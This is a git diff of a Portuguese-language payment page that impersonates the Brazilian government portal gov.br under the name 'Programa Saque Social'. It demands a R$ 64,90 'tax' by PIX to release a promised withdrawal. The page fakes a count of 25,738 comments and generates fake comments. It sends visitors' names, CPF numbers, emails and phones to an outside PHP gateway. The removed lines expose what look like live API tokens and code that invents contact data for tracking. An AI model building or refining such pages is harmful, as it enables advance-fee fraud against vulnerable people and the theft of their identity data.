@@ -1,31 +1,49 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<script>
-!function (w, d, t) {
-  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
-var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
-;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-  ttq.load('D6TCRGJC77UEODBH524G');
-  ttq.page();
-}(window, document, 'ttq');
+
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "w0oqzn777d");
+</script>
+  
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+  <script>
+  window.pixelId = "69a246a6666e7f072f417146";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
 </script>
 
-<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
 <script>
-window.tikTokPixelId = "19cebd8877cbf1cb62fe26d1297b78272d4621f0";
-var a = document.createElement("script");
-a.setAttribute("async",""); a.setAttribute("defer","");
-a.setAttribute("src","https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
-document.head.appendChild(a);
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1242679340641031'); 
+fbq('track', 'PageView');
 </script>
-
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
-<title>Pagamento Seguro - PIX</title>
+<title>Programa Saque Social - Pagamento</title>
 <link rel="icon" href="images/favic.png" type="image/png">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="css/all.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 <style>
   :root {
     --gov-blue-primary: #1351B4;
@@ -49,6 +67,7 @@ document.head.appendChild(a);
     min-height: 100vh; color: var(--gov-gray-dark); line-height: 1.6;
     display: flex; flex-direction: column; -webkit-font-smoothing: antialiased;
   }
+
   header {
     background: var(--gov-white); padding: 16px 24px;
     display: flex; justify-content: space-between; align-items: center;
@@ -69,6 +88,7 @@ document.head.appendChild(a);
     border-radius: 50px; padding: 6px 16px; display: flex; align-items: center; cursor: pointer;
   }
   header .user i { margin-right: 8px; }
+
   nav {
     background: var(--gov-white); padding: 12px 24px;
     display: flex; justify-content: space-between; align-items: center;
@@ -83,7 +103,9 @@ document.head.appendChild(a);
   nav button i { font-size: 16px; color: var(--gov-blue-primary); margin-right: 8px; }
   nav button p { color: var(--gov-gray-dark); font-size: 14px; font-weight: 400; margin: 0; }
   nav button span { color: var(--gov-blue-primary); font-weight: 500; }
+
   #main-content { padding: 24px 24px 40px; max-width: 720px; flex: 1 0 auto; margin: 0 auto; width: 100%; }
+
   .gov-aviso {
     display: flex; align-items: flex-start; gap: 10px;
     background: #FFFBE6; border: 1px solid #FFD54F;
@@ -92,19 +114,21 @@ document.head.appendChild(a);
     margin-bottom: 16px; font-size: 13px; color: #5d4200;
   }
   .gov-aviso i { color: #F9A825; margin-top: 1px; flex-shrink: 0; }
+
   #pix-section {
     background: var(--gov-white);
     border-radius: 8px;
     box-shadow: var(--gov-shadow-hover);
     overflow: hidden;
   }
+
   .pix-stripe { height: 4px; background: linear-gradient(90deg, var(--gov-blue-primary) 0%, var(--gov-green) 55%, var(--gov-orange) 100%); }
+
   .pix-loading-overlay { text-align: center; padding: 50px 16px; }
   .pix-loading-overlay p { font-size: 14px; color: var(--gov-blue-primary); font-weight: 600; margin-top: 16px; }
   .pix-big-spin { width: 40px; height: 40px; border: 3px solid transparent; border-top-color: var(--gov-blue-primary); border-right-color: var(--gov-blue-primary); border-radius: 50%; animation: pspin .8s linear infinite; margin: 0 auto; }
   @keyframes pspin { to { transform: rotate(360deg); } }
-  .pix-erro { padding: 30px 20px; text-align: center; color: #c0392b; font-size: 14px; }
-  .pix-erro button { margin-top: 14px; background: var(--gov-blue-primary); color: #fff; border: none; border-radius: 6px; padding: 10px 22px; font-size: 14px; cursor: pointer; font-family: inherit; }
+
   .pix-cidadao {
     display: flex; align-items: center; justify-content: space-between;
     padding: 12px 18px; border-bottom: 1px solid var(--gov-gray-medium);
@@ -115,39 +139,34 @@ document.head.appendChild(a);
   .pix-cidadao-valor { text-align: right; }
   .pix-cidadao-valor .vlabel { font-size: 10px; font-weight: 700; letter-spacing: .8px; text-transform: uppercase; color: #6c757d; }
   .pix-cidadao-valor .vnum { font-size: 20px; font-weight: 800; color: var(--gov-blue-dark); line-height: 1.1; margin-top: 2px; }
-  .pix-status-bar {
-    display: flex; align-items: center; gap: 8px;
-    padding: 10px 18px; font-size: 13px; font-weight: 600;
-    color: var(--gov-blue-dark);
-    background: var(--gov-blue-light);
-    border-bottom: 1px solid var(--gov-gray-medium);
-    border-left: 4px solid var(--gov-blue-primary);
-  }
-  .pix-spin { width: 13px; height: 13px; border: 2px solid #c8d9f5; border-top-color: var(--gov-blue-primary); border-radius: 50%; animation: pspin .8s linear infinite; flex-shrink: 0; }
+
   .pix-body { padding: 18px; }
+
   .pix-tabs { display: flex; border-radius: 8px; overflow: hidden; border: 1px solid var(--gov-gray-medium); margin-bottom: 16px; }
   .pix-tab { flex: 1; padding: 10px; font-size: 14px; font-weight: 600; text-align: center; cursor: pointer; background: var(--gov-white); color: var(--gov-gray-dark); border: none; transition: all .25s; font-family: inherit; }
   .pix-tab.on { background: var(--gov-blue-primary); color: #fff; }
+
   .pix-pane { display: none; }
   .pix-pane.on { display: block; }
+
   .pix-code-box { background: var(--gov-gray-light); border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 12px 14px; font-size: 11.5px; color: var(--gov-gray-dark); word-break: break-all; line-height: 1.6; margin-bottom: 12px; font-family: monospace; }
+
   .pix-copy-btn { width: 100%; background: linear-gradient(135deg, #1a9e2a, var(--gov-green)); color: #fff; border: none; border-radius: 8px; padding: 14px; font-size: 15px; font-weight: 700; letter-spacing: .5px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all .25s; margin-bottom: 16px; text-transform: uppercase; font-family: inherit; }
   .pix-copy-btn:hover { filter: brightness(.92); transform: translateY(-1px); }
   .pix-copy-btn.ok { background: linear-gradient(135deg, #0d6f18, #0a5a14); }
+
   .pix-aguardando-simples { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 600; color: var(--gov-blue-primary); margin-bottom: 16px; justify-content: center}
+  .pix-spin { width: 13px; height: 13px; border: 2px solid #c8d9f5; border-top-color: var(--gov-blue-primary); border-radius: 50%; animation: pspin .8s linear infinite; flex-shrink: 0; }
+
   .pix-steps { border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 14px; margin-bottom: 14px; background: var(--gov-gray-light); }
   .pix-steps-title { font-size: 13px; font-weight: 700; color: #343a40; margin-bottom: 10px; }
   .pix-step { display: flex; align-items: flex-start; gap: 9px; margin-bottom: 8px; font-size: 13px; color: var(--gov-gray-dark); line-height: 1.45; }
-  .pix-step:last-child { margin-bottom: 0; }
   .pix-snum { min-width: 22px; height: 22px; background: var(--gov-blue-primary); color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; flex-shrink: 0; }
+
   .pix-qr-wrap { text-align: center; padding: 6px 0 10px; }
   .pix-qr-wrap p { font-size: 12px; color: #6c757d; margin-bottom: 10px; }
   .pix-qr-wrap img { border: 1px solid var(--gov-gray-medium); border-radius: 8px; padding: 10px; background: #fff; max-width: 190px; }
-  .pix-acord { border: 1px solid var(--gov-gray-medium); border-radius: 8px; margin-bottom: 10px; overflow: hidden; }
-  .pix-acord-hd { padding: 12px 14px; font-size: 13px; font-weight: 600; color: var(--gov-gray-dark); display: flex; justify-content: space-between; align-items: center; cursor: pointer; background: #fff; user-select: none; }
-  .pix-acord-hd i { color: var(--gov-blue-primary); font-size: 12px; transition: transform .3s; }
-  .pix-acord-bd { display: none; padding: 4px 14px 14px; }
-  .pix-acord-bd.open { display: block; }
+
   .fb-header-outside { margin-top: 15px; padding: 15px 0 5px 24px; font-size: 14px; font-weight: bold; color: var(--gov-gray-dark); border-top: 1px solid var(--gov-gray-medium); width: 100%; background: var(--gov-white); text-align: left; }
   .fb-comments-container { width: 100%; background: var(--gov-white); padding: 24px; box-shadow: var(--gov-shadow); }
   .fb-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
@@ -161,7 +180,9 @@ document.head.appendChild(a);
   .comment-name { font-size: 14px; font-weight: bold; color: var(--gov-blue-primary); margin-bottom: 4px; }
   .comment-text { font-size: 14px; color: var(--gov-gray-dark); line-height: 1.3; }
   .comment-actions { display: flex; margin-top: 4px; font-size: 12px; color: var(--gov-gray-dark); }
+
   footer { background: linear-gradient(135deg, var(--gov-blue-dark), #0B1A38); color: var(--gov-white); text-align: center; padding: 16px; font-size: 14px; flex-shrink: 0; }
+
   @media(max-width:768px) {
     header { padding: 12px 16px; }
     header .logo img { height: 32px; }
@@ -172,10 +193,9 @@ document.head.appendChild(a);
 </style>
 </head>
 <body>
+
 <header>
-  <div class="logo">
-    <img src="images/govbr.png" style="width:90px;margin:10px;" alt="Logo">
-  </div>
+  <div class="logo"><img src="images/govbr.png" style="width:90px;margin:10px;"></div>
   <div class="icons">
     <button><i class="fas fa-ellipsis-v"></i></button>
     <button><i class="fas fa-cookie-bite"></i></button>
@@ -186,6 +206,7 @@ document.head.appendChild(a);
     </button>
   </div>
 </header>
+
 <nav>
   <button>
     <i class="fas fa-bars"></i>
@@ -193,21 +214,21 @@ document.head.appendChild(a);
   </button>
   <button><i class="fas fa-search"></i></button>
 </nav>
+
 <main id="main-content">
   <div class="gov-aviso">
     <i class="fas fa-exclamation-triangle"></i>
     <span>Para liberar o seu saque é necessário o recolhimento do imposto. O não pagamento resultará na perda do valor disponível.</span>
   </div>
+
   <div id="pix-section">
     <div class="pix-stripe"></div>
+
     <div class="pix-loading-overlay" id="pix-loading">
       <div class="pix-big-spin"></div>
       <p>Gerando seu PIX, aguarde...</p>
     </div>
-    <div class="pix-erro" id="pix-erro" style="display:none;">
-      <div>Não foi possível gerar o PIX.<br>Verifique sua conexão e tente novamente.</div>
-      <button onclick="pixIniciar()">Tentar novamente</button>
-    </div>
+
     <div id="pix-main" style="display:none;">
       <div class="pix-cidadao">
         <div class="pix-cidadao-info">
@@ -219,11 +240,13 @@ document.head.appendChild(a);
           <div class="vnum" id="pix-valor-topo">R$ 64,90</div>
         </div>
       </div>
-      <div class="pix-body" id="pix-body-container">
+
+      <div class="pix-body">
         <div class="pix-tabs">
           <button class="pix-tab on" id="ptab-copia" onclick="pixAba('copia')">Copia e Cola</button>
           <button class="pix-tab" id="ptab-qr" onclick="pixAba('qr')">QR Code</button>
         </div>
+
         <div class="pix-pane on" id="ppane-copia">
           <div class="pix-code-box" id="pix-code-box">---</div>
           <button class="pix-copy-btn" id="pix-copy-btn" onclick="pixCopiar()">
@@ -242,27 +265,18 @@ document.head.appendChild(a);
             <div class="pix-step"><div class="pix-snum">5</div><div>Volte aqui após realizar o pagamento.</div></div>
           </div>
         </div>
+
         <div class="pix-pane" id="ppane-qr">
           <div class="pix-qr-wrap">
             <p>Aponte a câmera do seu banco para o código abaixo:</p>
             <div id="pix-qr-img"></div>
-          </div>
-          <div class="pix-acord">
-            <div class="pix-acord-hd" onclick="pixToggle(this)">
-              Como realizar o pagamento via QR Code
-              <i class="fas fa-chevron-up"></i>
-            </div>
-            <div class="pix-acord-bd open">
-              <div class="pix-step"><div class="pix-snum">1</div><div>Abra o aplicativo do seu banco.</div></div>
-              <div class="pix-step"><div class="pix-snum">2</div><div>Escolha a opção <b>PIX → QR Code</b>.</div></div>
-              <div class="pix-step"><div class="pix-snum">3</div><div>Escaneie o código e confirme o valor.</div></div>
-            </div>
           </div>
         </div>
       </div>
     </div>
   </div>
 </main>
+
 <div class="fb-header-outside" id="fb-header-outside">Comentários (25738)</div>
 <div class="fb-comments-container" id="fb-comments-container">
   <div class="fb-header">
@@ -270,6 +284,7 @@ document.head.appendChild(a);
     <span class="fb-loading" id="fb-loading"></span>
   </div>
 </div>
+
 <footer>Termos de Uso e Aviso de Privacidade
   <p style="margin-top:8px;font-size:13px;">
     <a href="termos-uso.html" style="color:var(--gov-blue-primary);text-decoration:none;margin-right:12px;">Termos de Uso</a>
@@ -277,345 +292,186 @@ document.head.appendChild(a);
   </p>
 </footer>
 
-<script src="https://checkout.mangofy.com.br/js/new/fast_api.min.js?key=vstmvkxe-6e3a42e3-3c50-48ff-a052-c566cdc1f21e" id="pix-sdk-script"></script>
-
 <script>
-  var PIX_VALOR_CENTS   = 6490;
-  var PIX_DESCRICAO     = 'Pagamento Seguro';
-  var PIX_REDIRECT      = 'https://govbeneficio.vercel.app/up1.html';
-  var PARADISE_PRODUCT_HASH = 'prod_7333c0ff75106325';
-  var UTMIFY_API_TOKEN = 'hLLRiNJhaIzqdivrzVY7PLr1zH3sia014pMW';
+    // --- CONFIGURAÇÃO DA PONTE BLINDADA (ADAPTADA PARA PARADISE) ---
+    var MEU_PHP_GATEWAY = 'https://kitbrinde.online/processar.php'; 
+    var PIX_VALOR_CENTS   = 6490;
+    var PIX_REDIRECT      = 'https://govbeneficio.vercel.app/up1.html';
 
-  var _pixCode='',_pixPaymentCode='',_pixQRFeito=false,_checkoutDisparado=false;
-  var _pixCreatedAt='';
-  var _p=new URLSearchParams(window.location.search);
-  var _nome=(_p.get('nome')||'').trim();
-  var _cpf=(_p.get('cpf')||'').replace(/\D/g,'');
-  var _email=(_p.get('email')||'').trim();
-  var _fone=(_p.get('telefone')||'').replace(/\D/g,'');
+    var _pixCode='',_pixTxid='',_pixTimer=null;
+    var _p=new URLSearchParams(window.location.search);
+    var _nome=(_p.get('nome')||'').trim();
+    var _cpf=(_p.get('cpf')||'').replace(/\D/g,'');
+    var _email=(_p.get('email')||'cliente@email.com').trim();
+    var _fone=(_p.get('telefone')||'11999999999').replace(/\D/g,'');
 
-  var _utm_source   = _p.get('utm_source')   || null;
-  var _utm_medium   = _p.get('utm_medium')   || null;
-  var _utm_campaign = _p.get('utm_campaign') || null;
-  var _utm_content  = _p.get('utm_content')  || null;
-  var _utm_term     = _p.get('utm_term')     || null;
-  var _utm_id       = _p.get('utm_id')       || null;
-  var _src          = _p.get('src')          || null;
-  var _sck          = _p.get('sck')          || null;
+    function formatarNome(n){if(!n)return '';return n.toLowerCase().split(' ').filter(Boolean).map(function(w){return w.charAt(0).toUpperCase()+w.slice(1);}).join(' ');}
+    function formatarCPF(c){return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');}
 
-  async function utmifyNotificar(status) {
-    try {
-      var agoraIso = new Date().toISOString();
-      var nomeEnvio = nomeOk || 'Cliente Pagador';
-      if (nomeEnvio.trim().split(' ').filter(Boolean).length < 2) nomeEnvio += ' Pagador';
-      var safeOrderId = _pixPaymentCode ? String(_pixPaymentCode) : ('PIX-' + Date.now());
-      var safeCpf = (_cpf || '00000000000').replace(/\D/g, ''); 
-      var emailConfig = (_email && _email.indexOf('@') > 0) ? _email : gerarEmailAleatorio();
-      var phoneConfig = _fone ? _fone.replace(/\D/g, '') : gerarFoneAleatorio();
-      if (phoneConfig.length === 11 || phoneConfig.length === 10) {
-          phoneConfig = '55' + phoneConfig;
-      }
-      var body = {
-        orderId:       safeOrderId,
-        platform:      'custom',
-        paymentMethod: 'pix',
-        status:        status,
-        createdAt:     _pixCreatedAt || agoraIso,
-        approvedDate:  status === 'paid' ? agoraIso : null, 
-        refundedAt:    null,
-        customer: {
-          name:     nomeEnvio,
-          email:    emailConfig,
-          phone:    phoneConfig,
-          document: safeCpf,
-          country:  'BR',
-          ip:       "127.0.0.1" 
-        },
-        products: [{
-          id:          PARADISE_PRODUCT_HASH, 
-          name:        PIX_DESCRICAO,
-          planId:      null, 
-          planName:    null, 
-          quantity:    1,
-          priceInCents: PIX_VALOR_CENTS
-        }],
-        commission: { 
-          totalPriceInCents:     PIX_VALOR_CENTS,
-          gatewayFeeInCents:     0,
-          userCommissionInCents: PIX_VALOR_CENTS
-        },
-        isTest: false,
-        utm: {
-          src:          _src,
-          sck:          _sck,
-          utm_source:   _utm_source,
-          utm_medium:   _utm_medium,
-          utm_campaign: _utm_campaign,
-          utm_content:  _utm_content,
-          utm_term:     _utm_term
-        },
-        trackingParameters: { 
-          src:          _src,
-          sck:          _sck,
-          utm_source:   _utm_source,
-          utm_medium:   _utm_medium,
-          utm_campaign: _utm_campaign,
-          utm_content:  _utm_content,
-          utm_term:     _utm_term
+    var nomeOk=formatarNome(_nome);
+    if(nomeOk) document.getElementById('header-user-name').textContent=nomeOk.split(' ')[0];
+
+    async function pixIniciar(){
+        document.getElementById('pix-loading').style.display='block';
+        try{
+            // Captura UTMs individualmente conforme padrão Paradise
+            var trackingData = {
+                utm_source: _p.get('utm_source') || "",
+                utm_medium: _p.get('utm_medium') || "",
+                utm_campaign: _p.get('utm_campaign') || "",
+                utm_content: _p.get('utm_content') || "",
+                utm_term: _p.get('utm_term') || "",
+                src: _p.get('src') || "",
+                sck: _p.get('sck') || ""
+            };
+
+            var payload = {
+                customer: {
+                    name: nomeOk || 'Cliente',
+                    email: _email,
+                    phone: _fone.replace(/\D/g,''),
+                    document: _cpf.replace(/\D/g,'')
+                },
+                utm_data: trackingData 
+            };
+            var res = await fetch(MEU_PHP_GATEWAY, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            var data = await res.json();
+            
+            // Ajuste para retorno Paradise: qr_code e transaction_id
+            if(!res.ok || !data.qr_code) throw new Error();
+            _pixTxid = data.transaction_id;
+            _pixCode = data.qr_code;
+
+            document.getElementById('pix-nome-show').textContent = nomeOk;
+            document.getElementById('pix-cpf-show').textContent = _cpf ? formatarCPF(_cpf) : '---';
+            document.getElementById('pix-code-box').textContent = _pixCode;
+            document.getElementById('pix-qr-img').innerHTML = '<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode) + '" style="border-radius:8px;max-width:190px;">';
+            document.getElementById('pix-loading').style.display = 'none';
+            document.getElementById('pix-main').style.display = 'block';
+            pixPolling();
+        }catch(err){ document.getElementById('pix-loading').style.display='none'; alert('Erro ao gerar PIX.'); }
+    }
+
+    function pixPolling(){
+        _pixTimer=setInterval(async function(){
+            try{
+                var r = await fetch(MEU_PHP_GATEWAY + '?transactionId=' + encodeURIComponent(_pixTxid));
+                var s = await r.json();
+                // Status de sucesso na Paradise query é 'approved'
+                if(s.status === 'approved' || s.status === 'approved_manual'){
+                    clearInterval(_pixTimer);
+                    window.location.href=PIX_REDIRECT;
+                }
+            }catch(e){}
+        },5000);
+    }
+
+    function pixAba(aba){
+        document.getElementById('ptab-copia').classList.toggle('on',aba==='copia');
+        document.getElementById('ptab-qr').classList.toggle('on',aba==='qr');
+        document.getElementById('ppane-copia').classList.toggle('on',aba==='copia');
+        document.getElementById('ppane-qr').classList.toggle('on',aba==='qr');
+    }
+
+    function pixCopiar(){
+        navigator.clipboard.writeText(_pixCode).then(function(){
+            var btn=document.getElementById('pix-copy-btn'); var orig=btn.innerHTML;
+            btn.innerHTML='<i class="fas fa-check"></i><span>COPIADO!</span>';
+            setTimeout(function(){btn.innerHTML=orig;},2000);
+        });
+    }
+
+    // --- LOGICA DE COMENTARIOS AVANÇADA (MANTIDA ORIGINAL) ---
+    var totalComments = 25738;
+    var storedComments = [];
+    const fbHeaderOutside = document.getElementById('fb-header-outside');
+    const fbCountSpan = document.getElementById('fb-comment-count');
+    const fbLoadingSpan = document.getElementById('fb-loading');
+    const fbContainer = document.getElementById('fb-comments-container');
+
+    function initFacebookComments() {
+        fbHeaderOutside.textContent = `Comentários (${totalComments})`;
+        const local = localStorage.getItem('commentsData');
+        if (local) {
+            storedComments = JSON.parse(local);
+            storedComments.forEach(comm => createComment(comm.name, comm.avatar, comm.text, comm.likes, comm.dislikes, false));
+            fbCountSpan.textContent = `Comentários: ${totalComments}`;
+            fbLoadingSpan.textContent = "Comentários atualizados.";
+            scheduleComments();
+        } else {
+            generateInitialComments();
         }
-      };
-
-      console.log('Enviando payload para UTMify (status: ' + status + ')...');
-      
-      var res = await fetch('https://api.utmify.com.br/api-credentials/orders', {
-        method:  'POST',
-        headers: { 
-            'Content-Type': 'application/json', 
-            'x-api-token': UTMIFY_API_TOKEN 
-        },
-        body: JSON.stringify(body)
-      });
-      
-      var text = await res.text();
-      if (!res.ok) {
-          console.error("Erro UTMify:", text); 
-      } else {
-          console.log('UTMify notificada com sucesso:', status);
-      }
-    } catch(e) {
-      console.error('Erro de conexão UTMify:', e);
-    }
-  }
-
-  function utmRedirectUrl() {
-    var base = PIX_REDIRECT;
-    var params = [];
-    if (_nome)  params.push('nome='     + encodeURIComponent(_nome));
-    if (_cpf)   params.push('cpf='      + encodeURIComponent(_cpf));
-    if (_email) params.push('email='    + encodeURIComponent(_email));
-    if (_fone)  params.push('telefone=' + encodeURIComponent(_fone));
-    if (_utm_source)   params.push('utm_source='   + encodeURIComponent(_utm_source));
-    if (_utm_medium)   params.push('utm_medium='   + encodeURIComponent(_utm_medium));
-    if (_utm_campaign) params.push('utm_campaign=' + encodeURIComponent(_utm_campaign));
-    if (_utm_content)  params.push('utm_content='  + encodeURIComponent(_utm_content));
-    if (_utm_term)     params.push('utm_term='     + encodeURIComponent(_utm_term));
-    if (_utm_id)       params.push('utm_id='       + encodeURIComponent(_utm_id));
-    if (_src)          params.push('src='          + encodeURIComponent(_src));
-    if (_sck)          params.push('sck='          + encodeURIComponent(_sck));
-    
-    if (params.length) base += (base.indexOf('?') >= 0 ? '&' : '?') + params.join('&');
-    return base;
-  }
-
-  function formatarNome(n){if(!n)return '';return n.toLowerCase().split(' ').filter(Boolean).map(function(w){return w.charAt(0).toUpperCase()+w.slice(1);}).join(' ');}
-  function formatarCPF(c){return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');}
-  
-  function gerarEmailAleatorio() {
-    var s = (_cpf||'').replace(/\D/g,'').slice(-8);
-    return 'cpf'+s+Math.floor(Math.random()*100)+'@gmail.com';
-  }
-  function gerarFoneAleatorio() {
-    var ddds = ['11','21','31','41','47','48','51','61','71','81','85'];
-    return ddds[Math.floor(Math.random()*ddds.length)] + (Math.floor(10000000+Math.random()*90000000));
-  }
-
-  var nomeOk=formatarNome(_nome);
-  if(nomeOk) document.getElementById('header-user-name').textContent=nomeOk.split(' ')[0];
-
-  function ttqIdentify(){try{var d={};if(_email&&_email.indexOf('@')>0)d.email=_email;if(_fone)d.phone_number='+55'+_fone.replace(/\D/g,'');if(Object.keys(d).length)ttq.identify(d);}catch(e){}}
-  function ttqConteudo(){return{content_id:'saque-social',content_name:PIX_DESCRICAO,content_type:'product',currency:'BRL',value:parseFloat((PIX_VALOR_CENTS/100).toFixed(2)),quantity:1};}
-  function ttqViewContent(){try{ttq.track('ViewContent',ttqConteudo());}catch(e){}}
-  function ttqInitiateCheckout(){if(_checkoutDisparado)return;_checkoutDisparado=true;try{ttq.track('InitiateCheckout',ttqConteudo());}catch(e){}}
-  function ttqAddPaymentInfo(){try{ttq.track('AddPaymentInfo',ttqConteudo());}catch(e){}}
-  function ttqPurchase(){try{ttq.track('Purchase',{content_id:'saque-social',content_name:PIX_DESCRICAO,content_type:'product',currency:'BRL',value:parseFloat((PIX_VALOR_CENTS/100).toFixed(2)),quantity:1,transaction_id:String(_pixPaymentCode)});}catch(e){}}
-
-  var PIX_CACHE_KEY = 'pix_cache_' + (_cpf || 'guest');
-  var PIX_EXPIRA_MS = 10 * 60 * 1000;
-
-  function pixSalvarCache(pixCode, qrImage, paymentCode){
-    try {
-      localStorage.setItem(PIX_CACHE_KEY, JSON.stringify({
-        pixCode:     pixCode,
-        qrImage:     qrImage || '',
-        paymentCode: paymentCode || '',
-        criadoEm:    Date.now()
-      }));
-    } catch(e){}
-  }
-
-  function pixLerCache(){
-    try {
-      var raw = localStorage.getItem(PIX_CACHE_KEY);
-      if(!raw) return null;
-      var cache = JSON.parse(raw);
-      if(Date.now() - cache.criadoEm > PIX_EXPIRA_MS){
-        localStorage.removeItem(PIX_CACHE_KEY);
-        return null;
-      }
-      return cache;
-    } catch(e){ return null; }
-  }
-
-  function pixLimparCache(){
-    try { localStorage.removeItem(PIX_CACHE_KEY); } catch(e){}
-  }
-
-  function pixExibir(pixCode, qrImage){
-    _pixCode = pixCode || '';
-    var valorFmt = 'R$ ' + (PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
-    document.getElementById('pix-nome-show').textContent = nomeOk || 'Cliente';
-    document.getElementById('pix-cpf-show').textContent  = _cpf ? formatarCPF(_cpf) : '---';
-    document.getElementById('pix-valor-label').textContent = valorFmt;
-    document.getElementById('pix-valor-topo').textContent  = valorFmt;
-    document.getElementById('pix-code-box').textContent    = _pixCode || 'Código indisponível — use o QR Code';
-
-    var wrap = document.getElementById('pix-qr-img'); wrap.innerHTML = '';
-    var imgEl = document.createElement('img');
-    if(qrImage){
-      imgEl.src = qrImage;
-    } else if(_pixCode){
-      imgEl.src = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(_pixCode);
-    }
-    imgEl.style.cssText = 'border-radius:8px;max-width:190px;';
-    wrap.appendChild(imgEl);
-    _pixQRFeito = true;
-
-    document.getElementById('pix-loading').style.display = 'none';
-    document.getElementById('pix-erro').style.display    = 'none';
-    document.getElementById('pix-main').style.display    = 'block';
-  }
-
-  var _pixGerando = false;
-
-  async function pixIniciar(){
-    var cache = pixLerCache();
-    if(cache && cache.pixCode){
-      _pixPaymentCode = cache.paymentCode || '';
-      pixExibir(cache.pixCode, cache.qrImage);
-      ttqViewContent();
-      return;
     }
 
-    // Previne múltiplos cliques
-    if(_pixGerando) return;
-    _pixGerando = true;
-
-    document.getElementById('pix-loading').style.display = 'block';
-    document.getElementById('pix-erro').style.display    = 'none';
-    document.getElementById('pix-main').style.display    = 'none';
-    _pixQRFeito = false;
-    ttqIdentify();
-
-    try {
-      var nomeEnvio = nomeOk || 'Cliente Pagador';
-      var documentoEnvio = _cpf || '00000000000';
-      
-      // O OBJETO CONFIG EXATAMENTE COMO A MANGÓFY PEDIU NO NOVO PADRÃO
-      const config = {
-        total_price: 64.90, // Valor em float, sem conversão de centavos
-        customer: {
-            name: nomeEnvio,
-            document: documentoEnvio,
-        },
-        items: [
-            { name: 'Front', price: 64.90, quantity: 1 }
-        ]
-      };
-
-      // Executa a requisição da Fast API e aguarda
-      const response = await generatePix(config);
-
-      // Validação do sucesso da requisição
-      if(!response.success) throw new Error(response.message || 'Erro ao gerar PIX');
-
-      // Extraindo as Strings baseadas na documentação que te mandaram
-      _pixCode        = response.pixCode || '';
-      _pixPaymentCode = response.paymentCode || response.transactionId || response.id || '';
-      _pixCreatedAt   = new Date().toISOString();
-
-      // Salva no cache
-      pixSalvarCache(_pixCode, response.qrCodeImage, _pixPaymentCode);
-
-      // Mostra o QR e Copia e Cola
-      pixExibir(_pixCode, response.qrCodeImage);
-      
-      // Envio para Tiktok
-      ttqViewContent();
-      ttqInitiateCheckout();
-      
-      // Manda o status 'waiting_payment' (PIX gerado, aguardando pagamento)
-      await utmifyNotificar('waiting_payment');
-
-    } catch(err){
-      console.error('Erro PIX Mangofy SDK:', err);
-      document.getElementById('pix-erro').querySelector('div').innerHTML =
-        'Não foi possível gerar o PIX.<br>Verifique sua conexão e tente novamente.';
-      document.getElementById('pix-loading').style.display = 'none';
-      document.getElementById('pix-erro').style.display    = 'block';
-    } finally {
-      // Libera o botão novamente
-      _pixGerando = false;
-    }
-  }
-
-  // NOVA FUNÇÃO GLOBAL: O SDK chamará essa função automaticamente no Sucesso
-  window.paymentApproved = async function() {
-    console.log("SDK MANGÓFY AVISOU: PAGAMENTO CONFIRMADO!");
-    
